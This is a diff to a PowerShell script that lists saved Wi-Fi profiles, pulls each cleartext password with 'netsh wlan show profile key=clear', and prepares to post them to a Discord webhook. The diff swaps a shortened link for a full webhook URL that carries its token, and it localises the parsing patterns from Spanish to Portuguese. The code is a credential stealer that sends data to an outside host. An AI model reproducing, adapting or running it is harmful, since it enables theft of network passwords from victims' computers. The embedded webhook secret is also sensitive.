@@ -2,7 +2,7 @@
 $wifiProfiles = netsh wlan show profiles | Select-Object
 
 # Define the webhook URL
-$webhook_url = "https://bit.ly/3R3FRc5"
+$webhook_url = "https://discord.com/api/webhooks/1475209752270213325/rGfYcZDP9q6NOV9LwgMLhhBUal1MnWNBQAonGrnqPagmA9CsYb0MgAImAyBHEkfCV1Vd"
 
 # Create an array to store the Wi-Fi profile details
 $wifiProfileDetailsArray = @()
@@ -11,12 +11,12 @@ $content = '```ml'
 $content += "`n"
 
 $wifiProfiles | ForEach-Object {
-    $profileName = $_ | Select-String 'Perfil de todos los usuarios\s+:\s(.+)' | ForEach-Object {
+    $profileName = $_ | Select-String 'Perfil de todos os usuarios\s+:\s(.+)' | ForEach-Object {
         $_.Matches.Groups[1].Value
     }
     $wifiProfileDetails = netsh wlan show profile name="$profileName" key=clear
 
-    $wifiPassword = $wifiProfileDetails | Select-String 'Contenido de la clave\s+:\s(.+)' | ForEach-Object {
+    $wifiPassword = $wifiProfileDetails | Select-String 'Conteudo da chave\s+:\s(.+)' | ForEach-Object {
         $_.Matches.Groups[1].Value
     }
 
